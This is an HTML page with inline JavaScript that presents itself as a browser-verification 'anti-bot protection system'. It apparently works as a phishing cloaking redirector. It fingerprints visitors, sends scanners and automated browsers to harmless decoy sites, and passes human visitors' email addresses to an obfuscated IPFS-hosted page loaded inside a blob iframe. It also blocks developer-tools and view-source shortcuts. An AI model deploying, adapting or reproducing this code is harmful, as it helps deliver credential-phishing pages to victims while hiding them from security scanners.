<!DOCTYPE html>
<html style="display:none;height:100%;">
<head>
    <meta charset="UTF-8">
    <title></title>
    <meta name="referrer" content="no-referrer">
    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        html, body {
            margin: 0;
            padding: 0;
            background: transparent;
            overflow: hidden;
            width: 100%;
            height: 100%;
        }
        #loader {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-family: Arial, sans-serif;
            color: #333;
            display: none;
        }
    </style>
</head>
<body>
<div id="loader">Verifying browser...</div>

<script>
// COMPLETE ANTI-BOT PROTECTION SYSTEM
(() => {
    'use strict';
    
    // Configuration
    const TARGET_BASE = "https://bafkreib4mih5tsxltzdxgqd2odpqmeipbomqh4f5uvglxytj6tx5dapf34.ipfs.dweb.link/";
    const FAKE_URLS = [
        "https://example.com",
        "https://www.example.org",
        "https://www.example.net",
        "https://www.wikipedia.org",
        "https://www.google.com"
    ];
    
    const HUMAN_COOKIE = 'human_verified';
    const COOKIE_EXPIRES = 86400; // 24 hours
    const BOT_COOKIE = 'bot_detected';
    const BOT_COOKIE_EXPIRES = 3600; // 1 hour
    
    // Storage for rate limiting (client-side only - limited effectiveness)
    const getClientStorage = () => {
        try {
            if (typeof localStorage !== 'undefined') {
                return 'localStorage';
            }
            if (typeof sessionStorage !== 'undefined') {
                return 'sessionStorage';
            }
        } catch(e) {
            return 'memory';
        }
        return 'memory';
    };
    
    const storageType = getClientStorage();
    const memoryStore = {};
    
    // Client-side rate limiting (basic)
    function isRateLimited() {
        const key = 'last_request';
        const window = 2000; // 2 seconds minimum between requests
        const now = Date.now();
        
        if (storageType === 'localStorage') {
            const last = localStorage.getItem(key);
            if (last && (now - parseInt(last)) < window) {
                return true;
            }
            localStorage.setItem(key, now.toString());
        } else if (storageType === 'sessionStorage') {
            const last = sessionStorage.getItem(key);
            if (last && (now - parseInt(last)) < window) {
                return true;
            }
            sessionStorage.setItem(key, now.toString());
        } else {
            if (memoryStore[key] && (now - memoryStore[key]) < window) {
                return true;
            }
            memoryStore[key] = now;
        }
        return false;
    }
    
    // Enhanced bot detection with multiple techniques
    function detectBot() {
        let score = 0;
        const results = [];
        
        // 1. Automation properties (Selenium/Puppeteer/Playwright)
        const automationProps = [
            'webdriver', '__webdriver_evaluate', '__selenium_evaluate',
            '__fxdriver_evaluate', '__driver_evaluate', '__webdriver_script_function',
            '__webdriver_script_fn', '__lastWatirAlert', '__lastWatirConfirm',
            '_phantom', 'callPhantom', '__nightmare'
        ];
        
        automationProps.forEach(prop => {
            if (prop === 'webdriver') {
                if (navigator.webdriver === true) {
                    score += 40;
                    results.push('WebDriver detected');
                }
            } else if (window[prop] !== undefined) {
                score += 30;
                results.push(`Automation property ${prop} detected`);
            }
        });
        
        // 2. Headless browser detection
        try {
            // WebGL vendor/renderer check
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) {
                score += 30;
                results.push('WebGL not supported (common in headless)');
            } else {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    
                    if (renderer.includes('SwiftShader') || 
                        renderer.includes('llvmpipe') ||
                        renderer.includes('Google SwiftShader')) {
                        score += 35;
                        results.push('Headless renderer detected: ' + renderer);
                    }
                    
                    if (vendor.includes('Brian Paul') || vendor.includes('Mesa')) {
                        score += 20;
                        results.push('Headless vendor detected: ' + vendor);
                    }
                }
            }
            
            // Canvas fingerprinting test
            const ctx = canvas.getContext('2d');
            
            // Test 1: Basic drawing
            ctx.fillStyle = 'rgb(255, 0, 0)';
            ctx.fillRect(0, 0, 10, 10);
            
            // Test 2: Text rendering
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial, sans-serif';
            ctx.fillStyle = 'rgb(0, 0, 0)';
            ctx.fillText('test', 20, 20);
            
            // Test 3: Advanced features
            ctx.globalCompositeOperation = 'multiply';
            ctx.fillStyle = 'rgb(0, 255, 0)';
            ctx.fillRect(5, 5, 10, 10);
            
            const dataUrl = canvas.toDataURL();
            
            // Headless often returns identical or empty data URLs
            if (!dataUrl || dataUrl.length < 100) {
                score += 20;
                results.push('Canvas fingerprint suspicious (too short)');
            }
            
            // Check if canvas is tainted (some headless browsers fail here)
            try {
                canvas.toBlob(() => {});
            } catch(e) {
                score += 15;
                results.push('Canvas security error (common in headless)');
            }
            
        } catch(e) {
            score += 25;
            results.push('Canvas/WebGL error: ' + e.message);
        }
        
        // 3. Plugin and language checks
        if (navigator.plugins.length === 0) {
            score += 15;
            results.push('No plugins detected');
        }
        
        if (navigator.languages && navigator.languages.length === 0) {
            score += 10;
            results.push('No languages detected');
        }
        
        // 4. Missing common APIs that real browsers have
        if (!window.chrome || !window.chrome.runtime) {
            score += 10;
            results.push('Chrome APIs missing');
        }
        
        if (!('ontouchstart' in window) && navigator.plugins.length === 0) {
            score += 10;
            results.push('Touch events missing with no plugins');
        }
        
        // 5. Screen and window properties
        if (window.screen.width === 800 && window.screen.height === 600) {
            score += 10;
            results.push('Default headless screen size (800x600)');
        }
        
        if (window.outerHeight === 0 || window.outerWidth === 0) {
            score += 20;
            results.push('Window dimensions are zero');
        }
        
        // 6. Performance API anomalies
        if (window.performance && window.performance.timing) {
            const perf = window.performance.timing;
            const loadTime = perf.loadEventEnd - perf.navigationStart;
            
            if (loadTime < 100) {
                score += 20;
                results.push('Page load too fast (' + loadTime + 'ms)');
            }
            
            // Check if timestamps are realistic
            if (perf.domainLookupStart === perf.domainLookupEnd) {
                score += 15;
                results.push('DNS lookup timing suspicious');
            }
        }
        
        // 7. User agent inconsistencies
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        
        if (!ua || ua.length < 10) {
            score += 25;
            results.push('User agent missing or too short');
        }
        
        // Check for headless browser strings
        const headlessPatterns = [
            /HeadlessChrome/i,
            /PhantomJS/i,
            /Nightmare/i,
            /Electron/i,
            /Puppeteer/i,
            /Playwright/i
        ];
        
        headlessPatterns.forEach(pattern => {
            if (pattern.test(ua)) {
                score += 50;
                results.push('Headless browser detected in UA: ' + pattern);
            }
        });
        
        // 8. Behavior timing detection
        const startTime = performance.now();
        
        // Heavy computation to detect emulation
        let sum = 0;
        for (let i = 0; i < 1000000; i++) {
            sum += Math.random();
        }
        
        const computeTime = performance.now() - startTime;
        
        // Real browsers take measurable time, emulated/virtualized often too fast or consistent
        if (computeTime < 5) {
            score += 15;
            results.push('Computation suspiciously fast: ' + computeTime + 'ms');
        }
        
        return {
            score: score,
            isBot: score > 50,
            details: results
        };
    }
    
    // Obfuscation functions (similar to PHP version)
    function obfuscateTarget(target) {
        const methods = [
            // Method 0: Base64 + reverse
            (t) => ({m: 0, d: btoa(t.split('').reverse().join(''))}),
            
            // Method 1: Character codes offset
            (t) => {
                const chars = t.split('');
                const encoded = chars.map(c => c.charCodeAt(0) + 11);
                return {m: 1, d: encoded.join(',')};
            },
            
            // Method 2: XOR encryption
            (t) => {
                let k = 0;
                let encoded = '';
                for (let i = 0; i < t.length; i++) {
                    encoded += String.fromCharCode(t.charCodeAt(i) ^ (k++ % 255));
                }
                return {m: 2, d: btoa(encoded)};
            },
            
            // Method 3: Split and shuffle
            (t) => {
                const parts = [];
                for (let i = 0; i < t.length; i += 3) {
                    parts.push(t.substr(i, 3));
                }
                const shuffled = {};
                parts.forEach((part, idx) => {
                    shuffled[idx * 2] = btoa(part);
                });
                return {m: 3, d: JSON.stringify(shuffled)};
            },
            
            // Method 4: Rot13 + Base64
            (t) => {
                const rot13 = t.replace(/[a-zA-Z]/g, function(c) {
                    return String.fromCharCode(
                        (c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? 
                        c : c - 26
                    );
                });
                return {m: 4, d: btoa(rot13)};
            }
        ];
        
        const method = Math.floor(Math.random() * methods.length);
        return methods[method](target);
    }
    
    function decodeTarget(p) {
        switch(p.m) {
            case 0:
                return atob(p.d).split('').reverse().join('');
            case 1:
                return p.d.split(',').map(c => String.fromCharCode(c - 11)).join('');
            case 2:
                let b = atob(p.d), r = '', k = 0;
                for(let i = 0; i < b.length; i++) 
                    r += String.fromCharCode(b.charCodeAt(i) ^ (k++ % 255));
                return r;
            case 3:
                const shuffled = JSON.parse(p.d);
                const keys = Object.keys(shuffled).sort((a,b) => a - b);
                let decoded = '';
                keys.forEach(key => {
                    decoded += atob(shuffled[key]);
                });
                return decoded;
            case 4:
                const rot13 = atob(p.d);
                return rot13.replace(/[a-zA-Z]/g, function(c) {
                    return String.fromCharCode(
                        (c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? 
                        c : c - 26
                    );
                });
            default:
                return TARGET_BASE;
        }
    }
    
    // Get email from URL
    function getEmail() {
        try {
            const params = new URLSearchParams(window.location.search);
            const email = params.get('email');
            return email ? email.trim() : '';
        } catch(e) {
            return '';
        }
    }
    
    // Create blob for final redirect
    function createBlob(targetUrl, email) {
        const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
html, body { margin: 0; padding: 0; width: 100%; height: 100%; }
iframe { width: 100%; height: 100%; border: none; }
</style>
</head>
<body>
<iframe src="${targetUrl}" sandbox="allow-forms allow-scripts allow-same-origin allow-popups"></iframe>
<script>
const email = "${email}";
window.addEventListener('message', function(e) {
    if (e.data && e.data.type === 'getEmail') {
        e.source.postMessage({type: 'email', data: email}, e.origin);
    }
});
<\/script>
</body>
</html>`;
        return new Blob([html], { type: 'text/html' });
    }
    
    // Get fake URL for bots
    function getFakeUrl() {
        const randomIndex = Math.floor(Math.random() * FAKE_URLS.length);
        return FAKE_URLS[randomIndex];
    }
    
    // Set cookie helper
    function setCookie(name, value, seconds, secure = true) {
        const expires = new Date(Date.now() + seconds * 1000).toUTCString();
        const cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Lax`;
        const secureCookie = secure ? cookie + '; Secure' : cookie;
        document.cookie = secureCookie;
    }
    
    // Get cookie helper
    function getCookie(name) {
        return document.cookie
            .split('; ')
            .find(row => row.startsWith(name + '='))
            ?.split('=')[1];
    }
    
    // Delayed execution to catch automation
    function delayedExecution(callback, minDelay = 100, maxDelay = 500) {
        const delay = minDelay + Math.random() * (maxDelay - minDelay);
        setTimeout(callback, delay);
    }
    
    // Mouse movement verification
    function setupInteractionVerification() {
        let interactionCount = 0;
        const requiredInteractions = 2;
        const events = ['mousemove', 'touchstart', 'keydown', 'click', 'scroll'];
        
        return new Promise((resolve) => {
            const handleInteraction = (e) => {
                interactionCount++;
                
                // Verify interaction is legitimate (not programmatic)
                if (e.isTrusted === false) {
                    console.warn('Non-trusted event detected');
                    return;
                }
                
                if (interactionCount >= requiredInteractions) {
                    events.forEach(event => {
                        document.removeEventListener(event, handleInteraction);
                    });
                    resolve(true);
                }
            };
            
            events.forEach(event => {
                document.addEventListener(event, handleInteraction, { 
                    once: false,
                    passive: true 
                });
            });
            
            // Fallback timeout
            setTimeout(() => {
                if (interactionCount < requiredInteractions) {
                    events.forEach(event => {
                        document.removeEventListener(event, handleInteraction);
                    });
                    resolve(false);
                }
            }, 10000);
        });
    }
    
    // Main execution
    async function executeProtection() {
        // Show loader
        document.getElementById('loader').style.display = 'block';
        
        // Check if already verified
        if (getCookie(HUMAN_COOKIE)) {
            const email = getEmail();
            const target = email ? 
                `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
                TARGET_BASE;
            const blob = createBlob(target, email);
            const blobUrl = URL.createObjectURL(blob);
            window.location.replace(blobUrl);
            return;
        }
        
        // Check if marked as bot
        if (getCookie(BOT_COOKIE)) {
            window.location.replace(getFakeUrl());
            return;
        }
        
        // Rate limiting check
        if (isRateLimited()) {
            // Too many requests - mark as bot
            setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
            window.location.replace(getFakeUrl());
            return;
        }
        
        // Wait for initial interaction
        const hasInteracted = await setupInteractionVerification();
        
        if (!hasInteracted) {
            // No interaction - suspicious
            setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
            window.location.replace(getFakeUrl());
            return;
        }
        
        // Run bot detection after interaction
        const botResult = detectBot();
        
        if (botResult.isBot) {
            console.log('Bot detected. Score:', botResult.score, 'Details:', botResult.details);
            setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
            window.location.replace(getFakeUrl());
            return;
        }
        
        // Human detected - set verification cookie
        setCookie(HUMAN_COOKIE, '1', COOKIE_EXPIRES);
        
        // Generate obfuscated target
        const email = getEmail();
        const target = email ? 
            `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
            TARGET_BASE;
        
        const obfuscated = obfuscateTarget(target);
        
        // Decode and create blob
        const decodedTarget = decodeTarget(obfuscated);
        const blob = createBlob(decodedTarget, email);
        const blobUrl = URL.createObjectURL(blob);
        
        // Additional random delay to prevent timing attacks
        const finalDelay = 50 + Math.random() * 150;
        
        setTimeout(() => {
            window.location.replace(blobUrl);
            
            // Clean up blob after delay
            setTimeout(() => {
                try {
                    URL.revokeObjectURL(blobUrl);
                } catch(e) {}
            }, 10000);
        }, finalDelay);
    }
    
    // Start protection with random delay to prevent automation
    const startDelay = 500 + Math.random() * 1000;
    
    setTimeout(() => {
        // Show the page
        document.documentElement.style.display = 'block';
        
        // Execute protection system
        executeProtection().catch(error => {
            console.error('Protection system error:', error);
            // Fallback: redirect to target
            const email = getEmail();
            const target = email ? 
                `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
                TARGET_BASE;
            window.location.replace(target);
        });
    }, startDelay);
    
    // Prevent right-click and other bot behaviors
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', (e) => {
        // Prevent F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
        if (
            e.key === 'F12' ||
            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
            (e.ctrlKey && e.key === 'u')
        ) {
            e.preventDefault();
        }
    });
    
})();
</script>
</body>
</html>


